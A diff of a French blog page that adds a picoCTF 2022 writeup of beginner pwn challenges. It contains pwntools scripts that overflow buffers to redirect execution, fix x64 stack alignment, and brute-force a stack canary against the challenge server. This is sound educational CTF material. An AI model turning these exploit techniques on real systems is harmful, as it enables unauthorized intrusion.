@@ -27,7 +27,12 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/w31rdr4v3n.github.io\/fr\/picoctf2022-writeup\/"
-        },"image": ["https:\/\/w31rdr4v3n.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "picoCTF, pwn, reverse, crypto, forensic","wordcount":  14 ,
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/w31rdr4v3n.github.io\/images\/R4v3N.png",
+                            "width":  500 ,
+                            "height":  500 
+                        }],"genre": "posts","keywords": "picoCTF, pwn, reverse, crypto, forensic","wordcount":  1802 ,
         "url": "https:\/\/w31rdr4v3n.github.io\/fr\/picoctf2022-writeup\/","datePublished": "2022-03-29T05:17:59+01:00","dateModified": "2022-03-29T05:17:59+01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "_R4v3N","logo": {
@@ -100,8 +105,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">picoCTF2022 Writeup</h1><h2 class="single-subtitle">picoCTF2022 Writeup</h2><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/fr/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>_R4v3N</a></span>&nbsp;<span class="post-category">inclus dans <a href="/fr/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-29">2022-03-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;14 mots&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;Une minute&nbsp;<span id="/fr/picoctf2022-writeup/" class="leancloud_visitors" data-flag-title="picoCTF2022 Writeup">
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-29">2022-03-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1802 mots&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;<span id="/fr/picoctf2022-writeup/" class="leancloud_visitors" data-flag-title="picoCTF2022 Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;vues
                     </span>&nbsp;</div>
         </div><div class="featured-image"><img
@@ -116,16 +121,896 @@
                     <span>Contenu</span>
                     <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#basic-file-exploit-pwn">basic-file-exploit [Pwn]</a></li>
+    <li><a href="#buffer-overflow-0-pwn">buffer overflow 0 [Pwn]</a></li>
+    <li><a href="#buffer-overflow-1-pwn">buffer overflow 1 [Pwn]</a></li>
+    <li><a href="#rps-pwn">RPS [Pwn]</a></li>
+    <li><a href="#x-sixty-what-pwn">x-sixty-what [Pwn]</a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#movaps-stack-alignment">Movaps stack alignment</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#buffer-overflow-2-pwn">buffer overflow 2 [Pwn]</a></li>
+    <li><a href="#buffer-overflow-3-pwn">buffer overflow 3 [Pwn]</a></li>
+    <li><a href="#flag-leak-pwn">flag leak [Pwn]</a></li>
+    <li><a href="#ropfu-pwn">ropfu [Pwn]</a></li>
+    <li><a href="#wine-pwn">wine [Pwn]</a></li>
+    <li><a href="#function-overwrite-pwn">function overwrite [Pwn]</a></li>
+    <li><a href="#stack-cache-pwn">stack cache [Pwn]</a></li>
+  </ul>
+</nav></div>
             </div><div class="content" id="content"><p>Cet article présente des corrigés des défis du picoCTF 2022.</p>
+<h2 id="basic-file-exploit-pwn">basic-file-exploit [Pwn]</h2>
+<p>Le menu du programme : créer ou lire des entrées dans la base de données.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ nc saturn.picoctf.net <span class="m">49700</span>
+Hi, welcome to my <span class="nb">echo</span> chamber!
+Type <span class="s1">&#39;1&#39;</span> to enter a phrase into our database
+Type <span class="s1">&#39;2&#39;</span> to <span class="nb">echo</span> a phrase in our database
+Type <span class="s1">&#39;3&#39;</span> to <span class="nb">exit</span> the program
+</code></pre></td></tr></table>
+</div>
+</div><p>Dans le code source, avec le numéro d&rsquo;entrée 0 on pourra afficher le flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">((</span><span class="n">entry_number</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+  <span class="n">fseek</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/basic-file-exploit.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/basic-file-exploit.png, datas/basic-file-exploit.png 1.5x, /fr/picoctf2022-writeup/datas/basic-file-exploit.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/basic-file-exploit.png"
+        title="basic-file-exploit" /></p>
+<h2 id="buffer-overflow-0-pwn">buffer overflow 0 [Pwn]</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/bof0.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/bof0.png, datas/bof0.png 1.5x, /fr/picoctf2022-writeup/datas/bof0.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/bof0.png"
+        title="bof0" /></p>
+<h2 id="buffer-overflow-1-pwn">buffer overflow 1 [Pwn]</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">$ file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped
+</code></pre></td></tr></table>
+</div>
+</div><p>Le binaire est de 32 bits.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">get_return_address</span><span class="p">());</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>La taille des données entrées via <em>gets(buf)</em> n&rsquo;est pas contrôlée, on peut donc entrer n&rsquo;importe quoi.</p>
+<p>Ce qui peut causer un buffer overflow.</p>
+<p>Il suffit de contrôler l&rsquo;addresse de retour pour rediriger le flux d&rsquo;exécution vers la fonction <em>win()</em> afin d&rsquo;afficher le flag.</p>
+<p>Dans gdb, j&rsquo;ai placé un breakpoint sur le <em>ret</em> de <em>vuln()</em></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/bpbof1.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/bpbof1.png, datas/bpbof1.png 1.5x, /fr/picoctf2022-writeup/datas/bpbof1.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/bpbof1.png"
+        title="breakpoint" /></p>
+<p>Pour un test, j&rsquo;envoie ce payload: &ldquo;A&rdquo;*(32+4+4+4) + &ldquo;BBBB&rdquo;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/RIPbof1.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/RIPbof1.png, datas/RIPbof1.png 1.5x, /fr/picoctf2022-writeup/datas/RIPbof1.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/RIPbof1.png"
+        title="RIP" /></p>
+<p>Le EIP est bien atteint.</p>
+<p>Il reste à rediriger le flux d&rsquo;exécution vers la fonction <em>win()</em> à l&rsquo;adresse <em>0x080491f6</em>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#sh = process(&#34;./vuln&#34;)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">54376</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">32</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x080491f6</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagbof1.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/flagbof1.png, datas/flagbof1.png 1.5x, /fr/picoctf2022-writeup/datas/flagbof1.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/flagbof1.png"
+        title="flag" /></p>
+<h2 id="rps-pwn">RPS [Pwn]</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">wins</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Congrats, here&#39;s the flag!&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Si on gagne 5 fois, on a le flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="kt">char</span><span class="o">*</span> <span class="n">hands</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;rock&#34;</span><span class="p">,</span> <span class="s">&#34;paper&#34;</span><span class="p">,</span> <span class="s">&#34;scissors&#34;</span><span class="p">};</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">loses</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;paper&#34;</span><span class="p">,</span> <span class="s">&#34;scissors&#34;</span><span class="p">,</span> <span class="s">&#34;rock&#34;</span><span class="p">};</span>
+<span class="p">....</span>
+<span class="kt">int</span> <span class="n">computer_turn</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">3</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;You played: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">player_turn</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;The computer played: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hands</span><span class="p">[</span><span class="n">computer_turn</span><span class="p">]);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">player_turn</span><span class="p">,</span> <span class="n">loses</span><span class="p">[</span><span class="n">computer_turn</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You win! Play again?&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Seems like you didn&#39;t win this time. Play again?&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Pour gagner, il faut que le choix de l&rsquo;ordinateur existe dans le choix de joueur.</p>
+<p>J&rsquo;ai donc utilisé <em>paperscissorsrock</em> pour gagner les 5 fois.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/rps.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/rps.png, datas/rps.png 1.5x, /fr/picoctf2022-writeup/datas/rps.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/rps.png"
+        title="flag" /></p>
+<h2 id="x-sixty-what-pwn">x-sixty-what [Pwn]</h2>
+<p>Overflow x64 code</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./vuln&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">64</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401236</span><span class="p">))</span> <span class="c1"># flag() adresse: 0x00401236  </span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>çà a marché en local mais pas sur le server distant.</p>
+<p>Il s&rsquo;agit d&rsquo;un souci de Movaps stack alignment.</p>
+<h5 id="movaps-stack-alignment">Movaps stack alignment</h5>
+<p>Si vous faites une erreur de segmentation sur une instruction movaps dans buffered_vfprintf() ou do_system() dans les défis x86_64, assurez-vous que la pile est alignée sur 16 octets avant de revenir aux fonctions GLIBC telles que printf() ou system().<a href="https://ropemporium.com/guide.html" target="_blank" rel="noopener noreffer">En savoir plus&hellip;</a></p>
+<p>La solution consiste à appeler le ret d&rsquo;une autre adresse une fois de plus avant d&rsquo;appeler la fonction flag() lors de la conception de la pile de débordement, afin que l&rsquo;adresse rsp puisse être réduite de 8.</p>
+<p>J&rsquo;ai utilisé l&rsquo;adresse de retour de init.</p>
+<p>Pour le trouver: objdump vuln -M intel &ndash;disassemble=_init</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/init.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/init.png, datas/init.png 1.5x, /fr/picoctf2022-writeup/datas/init.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/init.png"
+        title="init" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">58049</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">64</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0040101a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401236</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagsixty.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/flagsixty.png, datas/flagsixty.png 1.5x, /fr/picoctf2022-writeup/datas/flagsixty.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/flagsixty.png"
+        title="flag" /></p>
+<h2 id="buffer-overflow-2-pwn">buffer overflow 2 [Pwn]</h2>
+<p>Contrôle de l&rsquo;adresse de retour et des arguments</p>
+<p>Appel fonction 32 bits: fun_addr + 4 octets + arg0 + arg1 + arg2 + &hellip;. + argn</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">60889</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">100</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049296</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;P&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xCAFEF00D</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xF00DF00D</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagbof2.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/flagbof2.png, datas/flagbof2.png 1.5x, /fr/picoctf2022-writeup/datas/flagbof2.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/flagbof2.png"
+        title="flagbof2" /></p>
+<h2 id="buffer-overflow-3-pwn">buffer overflow 3 [Pwn]</h2>
+<p>Brute force canary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+		<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">54629</span><span class="p">)</span>
+		<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">64</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+
+		<span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+		<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">a</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+		<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Partial canary: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+		<span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;*** Stack Smashing Detected&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">():</span>
+			<span class="n">canary</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+			<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Partial canary: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+			<span class="k">break</span>
+
+		<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Found canary: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/canary.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/canary.png, datas/canary.png 1.5x, /fr/picoctf2022-writeup/datas/canary.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/canary.png"
+        title="canary" /></p>
+<p>Exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;BiRd&#34;</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">60398</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Buffer?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span> <span class="c1"># Size of payload</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049336</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input&gt; &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;pico&#34;</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">break</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagbof3.png"
